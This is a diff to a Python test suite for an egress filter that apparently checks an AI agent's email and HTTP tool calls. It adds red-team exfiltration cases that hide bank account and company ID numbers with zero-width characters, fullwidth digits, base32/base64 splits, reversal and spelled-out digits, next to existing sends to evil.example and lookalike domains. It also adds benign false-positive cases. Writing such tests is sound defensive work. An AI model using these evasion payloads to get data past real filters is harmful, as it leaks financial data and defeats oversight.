@@ -22,12 +22,26 @@ EXFIL = [
     ("send_email", "fakturace@acme.cz", f"Our records: {ACME_IBAN}", None),  # allowlisted recipient, registry IBAN
     ("send_email", "fakturace@acme.cz", "CZ65 0800 0000 1920 0014 5399", None),  # spaced
     ("send_email", "fakturace@acme.cz", "ico 12345678 and 87654321", None),  # registry ICOs fail mod-11 on purpose
-    ("send_email", "fakturace@acme.cz", "partner IČO: 25596641", None),  # labelled, checksum-valid ICO
+    # red-team round 1 (all were ALLOW before the fix)
+    ("send_email", "accounting@acme.cz", "acct CZ65-0800-0000-1920-0014-5399", None),
+    ("send_email", "accounting@acme.cz", "acct CZ65.0800.0000.1920.0014.5399", None),
+    ("send_email", "accounting@acme.cz", "acct C\u200bZ\u200b6\u200b5\u200b0800000019\u200b2000145399", None),
+    ("send_email", "accounting@acme.cz", "ICO 1\u200b2\u200b3\u200b4\u200b5\u200b6\u200b7\u200b8", None),
+    ("send_email", "accounting@acme.cz", "acct CZ\uff16\uff15\uff10\uff18000000192000145399", None),
+    ("send_email", "accounting@acme.cz", "Send to 19-2000145399/0800 please", None),
+    ("send_email", "accounting@acme.cz", "account 000000192000145399 bank 0800", None),
+    ("send_email", "accounting@acme.cz", "blob INNDMNJQHAYDAMBQGAYDCOJSGAYDAMJUGUZTSOI=", None),
+    ("send_email", "accounting@acme.cz", "blob Ls~X9FgP$UFfcGMF*!0YFfcJRH8VLm", None),
+    ("send_email", "accounting@acme.cz", "p1=Q1o2NTA4MDAwMDAw p2=MTkyMDAwMTQ1Mzk5", None),
+    ("send_email", "accounting@acme.cz", "decode: PM6508000000192000145399", None),
+    ("send_email", "accounting@acme.cz", "reverse this: 9935410002910000008056ZC", None),
+    ("send_email", "accounting@acme.cz", "CZ six five zero eight zero zero zero zero zero zero one nine two zero zero zero "
+                                         "one four five three nine nine", None),
     ("send_email", "fakturace@acme.cz", "please use DE89370400440532013000 for refunds", None),  # foreign mod-97
     ("send_email", "fakturace@acme.cz", "card 4111 1111 1111 1111 exp 12/29", None),
     ("send_email", "fakturace@acme.cz", f"ref {B64_IBAN}", None),
     ("send_email", "fakturace@acme.cz", f"trace {HEX_IBAN}", None),
-    ("send_email", "fakturace@acme.cz", "Suppliers: ACME s.r.o., Beta Servis a.s.", None),
+    ("send_email", "fakturace@acme.cz", "ICO 1234 5678", None),
     ("send_email", "fakturace@acme.cz", f"![x](https://acme.cz/p.png?d={B64_IBAN})", None),
     ("send_email", "fakturace@acme.cz", "see attached", [{"name": "dump.csv", "content_b64": base64.b64encode(ACME_IBAN.encode()).decode()}]),
     ("send_email", "fakturace@acme.cz.evil.example", "Hello", None),  # suffix trick
@@ -35,7 +49,7 @@ EXFIL = [
     ("send_email", "fakturace@acmе.cz", "Hello", None),  # Cyrillic e homoglyph
     ("send_email", "a@acme.cz,b@evil.example", "Hello", None),
     ("http_get", f"https://evil.example/p.png?d={B64_IBAN}", "", None),
-    ("http_get", "https://acme.cz/track?v=12345678901234567890", "", None),  # data in URL to allowlisted host
+    ("http_get", "https://acme.cz/track?v=12-345-678", "", None),  # registry ICO in URL to allowlisted host
     ("http_get", f"https://acme.cz/{B64_IBAN}.png", "", None),
     ("http_post", "http://acme.cz/form", "Hello", None),  # not https
     ("http_post", "https://user@acme.cz/form", "Hello", None),
@@ -51,6 +65,15 @@ BENIGN = [
     ("send_email", "ap@airgap.example", "Internal: 3 invoices pending review."),
     ("http_get", "https://acme.cz/invoices?page=2", ""),
     ("http_get", "https://www.acme.cz/contact", ""),
+    # red-team round 1 false positives
+    ("send_email", "fakturace@acme.cz", "Dobry den, nase ICO 27082440, DIC CZ27082440. S pozdravem, AP"),
+    ("send_email", "fakturace@acme.cz", "Zasilka DPD 13965012345678, objednavka 4000123456789018 dorucena."),
+    ("send_email", "fakturace@acme.cz", "Polozka: 2 ks 1 250,00 21 % 525,00 3 025,00 Kc"),
+    ("send_email", "ap@airgap.example", "Paid today: ACME s.r.o. FV-2026-0412, Beta Servis a.s. 2026-118."),
+    ("http_get", "https://acme.cz/portal/invoice?no=FV20260412AB", ""),
+    ("http_get", "https://acme.cz/invoices/download?id=2026041201", ""),
+    ("http_get", "https://acme.cz/files/faktura-fv-2026-0412-acme-sro.pdf", ""),
+    ("http_get", "https://acme.cz/api/invoices/3f2b8c1e-9a4d-4e7f-b0c2-5d6e7f8a9b0c", ""),
 ]
 
 
@@ -74,12 +97,12 @@ def test_s9_exfil_corpus_zero_success():
 
 
 def test_s9_benign_pass():
-    h = Harness()
     for tool, target, content in BENIGN:
+        h = Harness()  # fresh rate-limit counter per case
         st, body = h.call("POST", "/egress", _request(tool, target, content), "tools")
         assert st == 200, (target, content, body)
         validate(body, "egress.response")
-    assert not [lf for lf in h.leaves() if lf["type"] == "egress_block"]
+        assert not [lf for lf in h.leaves() if lf["type"] == "egress_block"]
 
 
 @pytest.mark.parametrize("name", ["allow_vendor_reply", "block_exfil", "block_url_data"])
